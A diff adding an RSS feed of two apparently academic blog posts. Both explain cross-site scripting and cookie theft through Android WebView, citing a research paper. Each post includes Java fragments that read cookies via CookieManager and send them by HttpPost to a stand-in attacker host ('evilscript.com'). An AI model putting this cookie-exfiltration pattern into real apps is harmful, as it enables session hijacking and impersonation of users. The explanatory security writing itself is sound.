@@ -1,0 +1,72 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Android on IRA - Information Retrieval and Analytics</title>
+    <link>https://example.com/categories/android/</link>
+    <description>Recent content in Android on IRA - Information Retrieval and Analytics</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <copyright>Copyright © 2008–2018, Steve Francia and the Hugo Authors; all rights reserved.</copyright>
+    <lastBuildDate>Tue, 07 Jul 2015 00:00:00 +0000</lastBuildDate><atom:link href="https://example.com/categories/android/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Is your data in Android device safe??? – Cross Site Scripting attacks on Android WebView</title>
+      <link>https://example.com/post/cross-site-scripting-intro/</link>
+      <pubDate>Tue, 07 Jul 2015 00:00:00 +0000</pubDate>
+      
+      <guid>https://example.com/post/cross-site-scripting-intro/</guid>
+      <description>
+        
+          &lt;p&gt;Many of the Android applications display web content and also interact with it. This is possible by exposing a web browser as a standalone component and embedding it in the application. Such a component is called as WebView. WebView uses a number of APIs which can interact with the web contents inside WebView. In the current blog-post, Cross-site scripting attacks or XSS attacks specific to Android WebView are discussed.&lt;/p&gt;
+&lt;h3&gt;What is Cross-site Scripting?(XSS)&lt;/h3&gt;
+Cross-site scripting (XSS) is a type of computer security vulnerability typically found in Web Applications. To protect the user’s environment from malicious code, browsers use a sand-boxing mechanism that limits a script to access only resources associated with its origin site. Unfortunately, these security mechanisms fail if a user unknowingly executes a malicious script from an intermediate, trusted site. In this case, the malicious script is granted full access to all resources (e.g. Authentication tokens and cookies) that belong to the trusted site. Such attacks are called cross-site scripting (XSS) attacks.
+&lt;h3&gt;How are Cross-site scripting attacks possible in Android?&lt;/h3&gt;
+By finding ways of executing malicious scripts through the third party malicious app on phone, an attacker can gain elevated access-privileges to sensitive page content, session cookies, and a variety of other information in the phone such as contacts.
+&lt;h3&gt;Cross site Scripting by stealing cookies from user’s device&lt;/h3&gt;
+The most common behavior of XSS attacks is to gather cookies. Cookies are small text files that reside on a user’s computer and store name-value pairs along with some metadata. Cookies are commonly used to store information intended to be persistent during a browser session or from session to session, such as session IDs, user preferences, or login information.
+&lt;p&gt;&lt;img src=&#34;images/rgbcolorspace1.png&#34; alt=&#34;alt text&#34; title=&#34;Logo Title Text 1&#34;&gt;&lt;/p&gt;
+&lt;p&gt;When the user runs the application through the WebView, Android applications can monitor the events occurred within WebView. Cookies can be gathered at every page navigation of the user using the method getCookie() from CookieManager class as shown in the code fragment below.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;ln&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;CookieManager&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cookieManager&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;CookieManager&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getInstance&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;final&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;string&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cookie&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cookieManager&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getCookie&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;url&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Through HttpPost, malicious script can be run on the user’s Android device, cookies and URL can be sent to any third party (i.e., the attacker’s server), thus avoiding the same-origin policy or cookie protection mechanism.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;ln&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;HttpClient&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;httpClient&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;DefaultHttpClient&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;HttpPost&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;httpPost&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;HttpPost&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;“&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;http&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;//evilscript.com/androidCookie.php”);
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The attacker is now able get all the cookies and will be able to launch several attacks such a Session Hijacking and impersonating user using stolen cookies. The attacks described above are quite dangerous as the user sees only the trusted content and is not aware that his cookies are being stolen. The attack is shown in the figure.&lt;/p&gt;
+&lt;p&gt;The attacker is now able get all the cookies and will be able to launch several attacks such a Session Hijacking and impersonating user using stolen cookies. The attacks described above are quite dangerous as the user sees only the trusted content and is not aware that his cookies are being stolen.&lt;/p&gt;
+&lt;p&gt;NOTE: Please see the &lt;a href=&#34;%22http://ijcsn.org/IJCSN-2013/2-2/IJCSN-2013-2-2-03.pdf%22&#34;&gt;research publication&lt;/a&gt; for details.&lt;/p&gt;
+
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>Cross-site Scripting Attacks on Android WebView</title>
+      <link>https://example.com/post/cross-site-scripting/</link>
+      <pubDate>Fri, 05 Apr 2013 00:00:00 +0000</pubDate>
+      
+      <guid>https://example.com/post/cross-site-scripting/</guid>
+      <description>
+        
+          &lt;p&gt;WebView is an essential component in Android and iOS. It enables applications to display content from on-line resources. It simplifies task of performing a network request, parsing the data and rendering it. WebView uses a number of APIs which can interact with the web contents inside WebView. In the present post, Cross-site scripting attacks or XSS attacks specific to Android WebView are discussed. Cross-site scripting (XSS) is a type of vulnerability commonly found in web applications. This vulnerability makes it possible for attackers to run malicious code into victim’s WebView, through HttpClient APIs. Using this malicious code, the attackers can steal the victim’s credentials, such as cookies. The access control policies (i.e.,the same origin policy) employed by the browser to protect those credentials can be bypassed by exploiting the XSS vulnerability.&lt;/p&gt;
+&lt;h3&gt;Cross-site scripting (XSS)&lt;/h3&gt;
+Cross-site scripting (XSS) is a type of computer security vulnerability typically found in Web Applications. To protect the user’s environment from malicious code, browsers use a sand-boxing mechanism that limits a script to access only resources associated with its origin site. Unfortunately, these security mechanisms fail if a user unknowingly executes a malicious script from an intermediate, trusted site. In this case, the malicious script is granted full access to all resources (e.g. Authentication tokens and cookies) that belong to the trusted site. Such attacks are called cross-site scripting (XSS) attacks. In the present work, Cross-site scripting attacks on Android WebView are investigated. By finding ways of executing malicious scripts through the third party malicious app on phone, an attacker can gain elevated access-privileges to sensitive page content, session cookies, and a variety of other information in the phone such as contacts.
+&lt;h3&gt;Stealing cookies from the victim’s device &lt;/h3&gt;
+The most common behavior of XSS attacks is to gather cookies. Cookies are small text files that reside on a user’s computer and store name-value pairs along with some metadata. Cookies are commonly used to store information intended to be persistent during a browser session or from session to session, such as session IDs, user preferences, or login information. The cookie specifications assume that only the domain that set the cookie will be able to access it.
+&lt;h3&gt;Attack Method&lt;/h3&gt;
+When the user runs the application through the WebView, Android applications can monitor the events occurred within WebView. We override the shouldOverrideUrlLoading hook, which is triggered by the navigation event, (when the user tries to navigate to another URL). Cookies can be gathered at every page navigation of the user using the method getCookie() from CookieManager class as shown in the code fragment below:
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;ln&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;CookieManager&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cookieManager&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;CookieManager&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getInstance&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;final&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;String&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cookie&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cookieManager&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getCookie&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;url&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Through HttpPost, malicious script can be run on the user’s Android device, cookies and URL can be sent to any third party (i.e., the attacker’s server), thus avoiding the same-origin policy or cookie protection mechanism.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;ln&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;HttpClient&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;httpClient&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;DefaultHttpClient&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;HttpPost&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;httpPost&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;HttpPost&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;“&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;http&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;//evilScript/androidCookie.php&amp;#34;);
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The attacker is now able get all the cookies and will be able to launch several attacks such a Session Hijacking and impersonating user using stolen cookies. The attacks described above are quite dangerous as the user sees only the trusted content and is not aware that his cookies are being stolen.&lt;/p&gt;
+&lt;h3&gt;Session Hijacking&lt;/h3&gt;
+Session hijacking is a method of taking over a Web user session by stealthily obtaining the session ID and gaining unauthorized access. The session ID is normally stored within a cookie or URL. Once the user’s session ID has been accessed, the attacker can masquerade as that user and do anything the user is authorized to do on the network. From the web server’s point of view, a request from an attacker has the same authentication as the victim’s requests, thus the request is performed on behalf of the victim’s session. This usually results in the attacker being able to perform all normal web application functions with the same privileges of legitimate user (e.g. online bill pay, composing an email, etc.).
+&lt;h3&gt;Impersonating user using stolen cookies&lt;/h3&gt;
+If a website uses cookies as session identifiers, attackers can impersonate users after stealing victim’s cookies. By stealing cookies of social networking sites, message boards or forums, the attacker can post a new message in the victim’s name delete the victim’s post or exploit user’s credentials without his consent.
+&lt;p&gt;NOTE: Please see the &lt;a href=&#34;%22http://ijcsn.org/IJCSN-2013/2-2/IJCSN-2013-2-2-03.pdf%22&#34;&gt;research publication&lt;/a&gt; for more details&lt;/p&gt;
+
+        
+      </description>
+    </item>
+    
+  </channel>
+</rss>
